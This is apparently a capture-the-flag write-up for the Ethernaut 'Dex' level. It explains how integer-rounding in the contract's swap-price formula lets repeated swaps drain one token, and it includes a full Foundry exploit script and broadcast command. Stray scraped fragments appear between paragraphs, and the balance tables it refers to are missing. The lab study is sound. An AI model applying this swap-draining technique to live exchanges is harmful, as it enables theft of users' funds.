@@ -1,0 +1,107 @@
+"This level is a Dex contract or decentralized exchange platform that deals with token swapping and exchange. Our player has been provided with 10 tokens each of token1 and token2, the two types of tokens handled by the Dex. The Dex contract has a balance of 100 tokens each. 
+To complete this level, we need to drain either all the tokens from token1 or token2 from the contract. Even though the contract looks bigger than other levels, it is one of the simplest once you get to know the logic and dangers of divisions (**wink wink**) and multiplications in solidity. Let's dive in.
+We will go through each function one by one. 
+function setTokens(address _token1, address _token2) public onlyOwner {
+    token1 = _token1;
+    token2 = _token2;
+}
+
+The setTokens() is used to set the address for each token contract. This can only be called by the owner due to the modifier onlyOwner. 
+setTokens()
+onlyOwner
+function addLiquidity(address token_address, uint amount) public onlyOwner {
+    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+}
+
+The addLiquidity() function can also be called by only the owner to provide liquidity to the contract. This transfers the approved amount of tokens from the token address to the Dex. 
+addLiquidity()
+function swap(address from, address to, uint amount) public {
+    require((from == token1 && to == token2) || (from == token2 && to == token1), ""Invalid tokens"");
+    require(IERC20(from).balanceOf(msg.sender) >= amount, ""Not enough to swap"");
+    uint swapAmount = getSwapPrice(from, to, amount);
+    IERC20(from).transferFrom(msg.sender, address(this), amount);
+    IERC20(to).approve(address(this), swapAmount);
+    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+}
+
+swap()
+x
+from
+to
+amount
+setTokens()
+swapAmount
+getSwapPrice()
+transferFrom()
+swapAmount
+approve
+to
+function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+}
+
+This function is taking addresses for both the tokens and the amount of from tokens to be swapped and calculates the amount of to tokens. The following formula is used - 
+from
+to
+The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
+
+This is the vulnerable function. We will be exploiting the fact that there are no floating points in solidity which means whenever the function will do a division, the result will be a fraction. Since there are no decimals and floating points, the token amount will be rounded off towards zero. Therefore, by making continuous token swaps from token1 to token2 and back, we can decrease the total balance of one of the tokens in the contract to zero. The precision loss will automatically do the job for us. 
+function approve(address spender, uint amount) public {
+    SwappableToken(token1).approve(msg.sender, spender, amount);
+    SwappableToken(token2).approve(msg.sender, spender, amount);
+}
+
+The approve is an ERC20 function that is used to give permission to the spender to spend amount tokens. 
+amount
+The balanceOf() function is just used to calculate the remaining token balance of the address. 
+balanceOf()
+To exploit this level, we have to swap all our token1 for token2. Then swap all our token2 for token1. And repeat this process. Let's take a look at the token table. 
+Now, when the user swaps 20 token2 for token1, the formula will return the following - 
+Number of token1 tokens returned = (20 * 110)/90 = 24.44
+
+This value will be rounded off to 24. This means Dex will now have 86 token1, and 110 token2 and our user will have 24 token1 and 0 token2. 
+If this is repeated a few more times, it will produce the values shown below. 
+We can see that on each token swap, we are left with more tokens than held previously. 
+((65*110)/45 = 158)
+This means that in the final step if we need to drain 110 token1, the amount of token2 to be swapped is (65 * 110)/158 = 45. This will bring the token1 balance of the Dex to 0. 
+(65 * 110)/158 = 45
+Let's take a look at our exploit script:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel22.sol"";
+
+contract POC is Script {
+
+    Dex level22 = Dex(0x84c765cfdbA36b9e81Db0eb7C9356eed77296ed6);
+    function run() external{
+        vm.startBroadcast();
+        level22.approve(address(level22), 500);
+        address token1 = level22.token1();
+        address token2 = level22.token2();
+
+        level22.swap(token1, token2, 10);
+        level22.swap(token2, token1, 20);
+        level22.swap(token1, token2, 24);
+        level22.swap(token2, token1, 30);
+        level22.swap(token1, token2, 41);
+        level22.swap(token2, token1, 45);
+
+        console.log(""Final token1 balance of Dex is : "", level22.balanceOf(token1, address(level22)));
+        vm.stopBroadcast();
+    }
+}
+
+First of all, we are approving some 500 tokens to allow Dex to spend using approve() for both token1 and token2. 
+approve()
+After approving all the tokens at once, we are making swap() calls according to our table shown above. The last line is just used to check the remaining token1 balance of the contract which should be 0 if the attack is successful. 
+swap()
+Let's execute the script using the following command:
+forge script ./script/level22.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv
+
+The log output can be seen below showing that the attack was successful. The instance can now be submitted to finish the level. 
+
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
+When doing calculations related to any sensitive asset such as tokens, careful attention should be paid to precision since there are no floating points in solidity, precision is lost as numbers are rounded off leading to exploits such as the one shown above"
